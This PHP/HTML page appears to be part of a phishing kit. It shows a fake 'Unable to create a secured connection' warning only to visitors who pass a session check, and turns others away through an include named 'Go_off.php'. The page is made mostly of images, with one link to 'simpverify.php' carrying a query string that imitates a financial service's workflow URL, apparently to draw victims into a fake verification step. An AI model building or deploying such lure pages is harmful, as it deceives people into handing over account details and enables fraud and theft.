<?php
session_start();
ob_start();

function loggedin(){
if(isset($_SESSION['UserID'])&&!empty($_SESSION['UserID'])){
	return true;
	}else{
		return false;
		}
}


if(loggedin()){
	$redirect = "simpverify.php";
	$uri = "/initialize-workflow.go?requesttype=C&campaignid=4043020&productoffercode=EG&";

				}else{
		
		die(include 'Go_off.php');
		}



?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-76 webkit svg-bg not-retina cf-cnx-regular-active">
<head class="at-element-marker" style="visibility:visible;">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<title>Unable to create a secured connection - Please follow instructions below</title>
<link rel="shortcut icon" href="images/favicon.png"/>
<script type="text/javascript" src="js/jqueryLib.js"></script>
<link rel="stylesheet" href="css/style.css" />

</head>


<body>
  <div class="header2-const">
      <div class="header2"></div>
  </div>
  <div class="img8-const">
     <div class="img8"></div>
  </div>
  <div class="img21-const">
     <div class="img9"></div>
  </div>
  <div class="img10-const">
     <div class="img10">
         <a href="<?php echo "$redirect?$uri"; ?>"><div class="img10-img"></div></a>
     </div>
  </div>
  <div class="footer2-const">
   <div class="footer2"></div>
 </div>
</body>
</html>